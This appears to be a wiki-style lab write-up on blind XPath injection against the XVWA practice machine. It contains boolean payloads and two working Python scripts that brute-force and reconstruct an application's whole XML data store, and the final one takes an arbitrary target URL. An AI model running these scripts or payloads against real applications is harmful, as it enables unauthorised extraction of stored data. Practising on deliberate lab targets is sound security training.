**XPath** is a query language used in **XML** that allows searching and retrieving specific information from **XML documents**. However, like other programming and query languages, XPath can also have **vulnerabilities** that attackers can exploit to compromise the security of a web application.

**XPath vulnerabilities** are those that take advantage of weaknesses in the implementation of XPath queries in a web application. Below are some common types of XPath vulnerabilities:

- **XPath Injection**: Attackers can inject malicious code into XPath queries to alter the expected behavior of the application. For example, they may add a malicious query that retrieves all user information, including sensitive data like passwords.
- **XPath Brute Force**: Attackers can use brute-force techniques to guess XPath paths and retrieve confidential information. This technique involves trying different XPath paths until one returns sensitive data.
- **Server Information Retrieval**: Attackers can use malicious XPath queries to obtain information about the server, such as the database type, application version, etc. This information can help attackers plan more sophisticated attacks.
- **XPath Response Manipulation**: Attackers can manipulate XPath responses from the web application to obtain additional information or alter the application's behavior. For example, they may modify an XPath response to create a user account without permission.

To protect against XPath vulnerabilities, it is important to validate all user input and avoid dynamic construction of XPath queries. Additionally, it is recommended to restrict access permissions to web application resources and keep software and operating systems updated. Finally, using security analysis tools and conducting regular penetration tests can help identify and fix any vulnerabilities in the web application.

**LABORATORY**  
- **XVWA 1**: [https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/](https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/)

![Pasted image 20260209170211](/VaultSite/wiki-images/Pasted%20image%2020260209170211.png)

We see a search by ID on the main page. The first thing that comes to mind is to test SQL or NoSQL injections.  
![Pasted image 20260209170405](/VaultSite/wiki-images/Pasted%20image%2020260209170405.png)

Let's open Burp to begin while we send the request.  
![Pasted image 20260209170649](/VaultSite/wiki-images/Pasted%20image%2020260209170649.png)

First, let's try SQLi in the search field by entering a `'`, but we see it returns "item not found," even if we try other types of SQL injections.  

![Pasted image 20260209170731](/VaultSite/wiki-images/Pasted%20image%2020260209170731.png) ![Pasted image 20260209170804](/VaultSite/wiki-images/Pasted%20image%2020260209170804.png)

With SQL injections, it's common that when we have a query like `select * from users where username = 'input'`, if we try the typical `1'` in the input, a hanging quote causes a syntax error. To avoid this, we can use **`select * from users where username = '' or '1'='1'`**, which avoids dangling quotes that would trigger errors.  

Here, we can see all the products:  
![Pasted image 20260209171141](/VaultSite/wiki-images/Pasted%20image%2020260209171141.png)  
Here, we would try to sort based on columns, but we see no results, so we discard SQLi and also NoSQLi.  
![Pasted image 20260209171359](/VaultSite/wiki-images/Pasted%20image%2020260209171359.png)

This seems odd because the first SQL injection worked, but the others didn't.  

If we look at XPath query syntax, we can see it's quite similar:  
![Pasted image 20260209171705](/VaultSite/wiki-images/Pasted%20image%2020260209171705.png)  
but the rest of the queries are completely different.  

Now, we'll try to see all the tags in the XML to reconstruct it ourselves.  

To see how many primary tags the XML has, we could inject **`and count(/* )='1`**. With this query, we're saying the product is 1 and concatenating a query that counts the total number of tags (the 1). We'd adjust this parameter until we find the correct one.  
![Pasted image 20260209172158](/VaultSite/wiki-images/Pasted%20image%2020260209172158.png)  
If the number of tags isn't correct, nothing appears.  
![Pasted image 20260209172236](/VaultSite/wiki-images/Pasted%20image%2020260209172236.png)

So, we now know there's only one primary tag. Next, we'd replace `count` with `name`, add a `[1]` (if there were more tags, we'd adjust the number accordingly), and specify the tag name, which we already know.  
![Pasted image 20260209172630](/VaultSite/wiki-images/Pasted%20image%2020260209172630.png)  
Normally, we wouldn't know this, so we'd have to use a script (like with time-based SQL) or manually filter by the first character and iterate through each character, adjusting the second parameter and the letter.  
![Pasted image 20260209172811](/VaultSite/wiki-images/Pasted%20image%2020260209172811.png)  
#### SCRIPT
#!/usr/bin/python3
import requests
import signal
import sys
import string
from pwn import log

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables globales
main_url = "http://192.168.111.41/xvwa/vulnerabilities/xpath/"
#Ampliamos caracteres por si hay números o símbolos en los nodos
characters = string.ascii_letters + string.digits + "_-"

def xPathInjection():
    data = ""
    p1 = log.progress("XPath Injection")
    p1.status("Iniciando ataque de fuerza bruta...")
    
    p2 = log.progress("Nodo extraído")

    # Usamos un bucle infinito para no limitarnos a 8 caracteres
    position = 1
    while True:
        encontrado = False
        for character in characters:
            p2.status(data + character)
            
            # Payloads dinámicos usando f-strings
            # Buscamos el nombre del nodo actual (name(/*[1]))
            post_data = {
                'search': f"1' and substring(name(/*[1]),{position},1)='{character}'",
                'submit': ''
            }

            try:
                r = requests.post(main_url, data=post_data, timeout=5)
                
                # Si la longitud cambia, es que la condición es TRUE
                if len(r.text) != 8681:
                    data += character
                    encontrado = True
                    position += 1
                    break
            except requests.exceptions.RequestException as e:
                log.error(f"Error de conexión: {e}")
                sys.exit(1)

        if not encontrado:
            # Si recorre todos los caracteres y no hay match, terminó el nombre
            break

    p1.success("Extracción completada")
    p2.success(f"Resultado: {data}")

if __name__ == '__main__':
    xPathInjection()

#### SECOND PART OF THE LABORATORY
Now, we'll enumerate the secondary tags. To do this, we'll add `[1]/*` to the `count` we used earlier, where `[1]` refers to the primary tag we found, and `/*` tells it to search for secondary tags within this primary tag. If there were more primary tags, we'd adjust the `[1]` parameter.  
![Pasted image 20260209175320](/VaultSite/wiki-images/Pasted%20image%2020260209175320.png)  
Here, we're checking if there are more than 9, and we see there are. When we reach 10, nothing appears, but if we use `>=10`, we see it, so we know there are 10 secondary tags.  
![Pasted image 20260209175454](/VaultSite/wiki-images/Pasted%20image%2020260209175454.png)  
Now, we'd repeat the same process as before to find the names of the tags, listing each letter or the length of the tag name with Burp, adding `[1]/*`.

Once we've listed all the tags we want, the next step is to list the content of those tags. For this, we'll take product 1 (the one we're examining) and use `substring` to guess the first character of, for example, the `secret` field, which we already know.  
We see it starts with `E`:  
![Pasted image 20260209181004](/VaultSite/wiki-images/Pasted%20image%2020260209181004.png)  

The easiest way to do all this would be to adapt the previous script.  

Requeriments.xml 
```
pip3 install requests pwntools tqdm

chmod +x xpath_pro.py

python3 xpath_pro.py -u http://url.com -d 3
```
Note title: Untitled

With -d we can set the scan depth - higher values increase intensity

##### FINAL SCRIPT
#!/usr/bin/python3
from pwn import *
import requests, sys, string, time, argparse
from collections import deque
from tqdm import tqdm # You need to install it: pip install tqdm

#ANSI Colors
BLACK, RED, GREEN, YELLOW = '\033[30m', '\033[31m', '\033[32m', '\033[33m'
BLUE, MAGENTA, CYAN, WHITE = '\033[34m', '\033[35m', '\033[36m', '\033[37m'
RESET = '\033[0m'

def getARG():
    parser = argparse.ArgumentParser(description="Advanced XPath Injection Tool with Progress Bar")
    parser.add_argument("-u", "--url", dest="url", required=True, help="Vulnerable endpoint URL")
    parser.add_argument("-d", "--depth", dest="depth", type=int, default=3, help="Maximum depth")
    return parser.parse_args()

chars = string.ascii_letters + ' ' + string.digits + "._-@!"

class DataTreeNode:
    def __init__(self, value=""):
        self.value = value
        self.name = ''
        self.data = ''
        self.path = ''
        self.depth = 0
        self.children = []

    def addChild(self, child): self.children.append(child)
    def addName(self, name): self.name = name
    def addData(self, data): self.data = data
    def addPath(self, path): self.path = path
    def addDepth(self, depth): self.depth = depth

def getLengthOfTrueResponse(url):
    post_data = {'search': "1' and '1'='1", 'submit': ''}
    r = requests.post(url, data=post_data)
    return len(r.text)

def exploreNode(url, MAX_depth):
    true_len = getLengthOfTrueResponse(url)
    root = DataTreeNode("root")
    stack = [(root, 0)]
    
    print(f"{BLUE}[*] Mapping tree structure...{RESET}")
    
    while stack:
        current_node, depth = stack.pop()
        if depth < MAX_depth:
            number = 1
            while True:
                payload = f"1' and count(/*{current_node.path}/*)='{number}'"
                r = requests.post(url, data={'search': payload, 'submit': ''})
                if len(r.text) == true_len:
                    for i in range(1, number + 1):
                        new_node = DataTreeNode()
                        actualPath = f"{current_node.path}/*[{i}]"
                        new_node.addPath(actualPath)
                        new_node.addDepth(depth + 1)
                        current_node.addChild(new_node)
                        stack.append((new_node, depth + 1))
                    break
                if number > 20: break 
                number += 1
    return root

def getInfoFromTags(url, root_children):
    true_len = getLengthOfTrueResponse(url)
    all_nodes = []
    queue = deque(root_children)
    while queue:
        n = queue.popleft()
        all_nodes.append(n)
        queue.extend(n.children)

    # Progress bar for tags
    for node in tqdm(all_nodes, desc=f"{CYAN}Extracting Tags{RESET}", unit="tag"):
        length = 0
        for n in range(1, 30):
            payload = f"1' and string-length(name(/*{node.path}))='{n}'"
            if len(requests.post(url, data={'search': payload, 'submit': ''}).text) == true_len:
                length = n
                break
        
        name = ""
        for i in range(1, length + 1):
            for char in chars:
                payload = f"1' and substring(name(/*{node.path}),{i},1)='{char}'"
                if len(requests.post(url, data={'search': payload, 'submit': ''}).text) == true_len:
                    name += char
                    break
        node.addName(name)

def getDataForEachTag(url, root_children):
    true_len = getLengthOfTrueResponse(url)
    leaf_nodes = []
    queue = deque(root_children)
    while queue:
        n = queue.popleft()
        if not n.children: leaf_nodes.append(n)
        queue.extend(n.children)

    # Progress bar for data
    for node in tqdm(leaf_nodes, desc=f"{GREEN}Extracting Data{RESET}", unit="data"):
        length = 0
        for n in range(1, 50):
            payload = f"1' and string-length(/*{node.path})='{n}'"
            if len(requests.post(url, data={'search': payload, 'submit': ''}).text) == true_len:
                length = n
                break
        
        data = ""
        for i in range(1, length + 1):
            for char in chars:
                payload = f"1' and substring(/*{node.path},{i},1)='{char}'"
                if len(requests.post(url, data={'search': payload, 'submit': ''}).text) == true_len:
                    data += char
                    break
        node.addData(data)

def print_tree(node, indent=""):
    res = ""
    if not node.children:
        line = f"{indent}<{node.name}>{node.data}</{node.name}>"
        print(f"{indent}{RED}<{RESET}{WHITE}{node.name}{RESET}{RED}>{RESET}{node.data}{RED}</{RESET}{WHITE}{node.name}{RESET}{RED}>{RESET}")
        return line + "\n"
    else:
        print(f"{indent}{RED}<{RESET}{WHITE}{node.name}{RESET}{RED}>{RESET}")
        res += f"{indent}<{node.name}>\n"
        for child in node.children:
            res += print_tree(child, indent + "  ")
        print(f"{indent}{RED}</{RESET}{WHITE}{node.name}{RESET}{RED}>{RESET}")
        res += f"{indent}</{node.name}>\n"
    return res

if __name__ == "__main__":
    args = getARG()
    print(f"\n\t{MAGENTA}--- XPATH RECONSTRUCTION TOOL (PRO) ---{RESET}\n")
    
    tree_root = exploreNode(args.url, args.depth)
    
    if tree_root.children:
        getInfoFromTags(args.url, tree_root.children)
        getDataForEachTag(args.url, tree_root.children)
        
        print(f"\n{YELLOW}[+] Final XML Structure:{RESET}\n")
        xml_output = print_tree(tree_root.children[0])
        
        with open("output.xml", "w") as f:
            f.write(xml_output)
            print(f"\n{GREEN}[!] XML saved to output.xml{RESET}")